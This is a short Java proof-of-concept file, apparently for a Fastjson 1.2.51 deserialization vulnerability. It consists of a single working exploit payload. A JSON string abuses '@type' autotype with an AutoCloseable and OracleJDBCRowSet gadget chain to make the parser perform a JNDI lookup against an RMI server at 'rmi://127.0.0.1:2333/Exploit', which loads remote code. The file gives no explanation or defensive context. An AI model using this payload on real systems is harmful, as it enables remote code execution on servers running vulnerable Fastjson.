package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;

public class PoC_1_2_51 {
    public static void main(String[] args) {
        String string ="{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"oracle.jdbc.rowset.OracleJDBCRowSet\",\"dataSourceName\":\"rmi://127.0.0.1:2333/Exploit\",\"command\":\"a\"}";
        JSON.parse(string);
    }
}
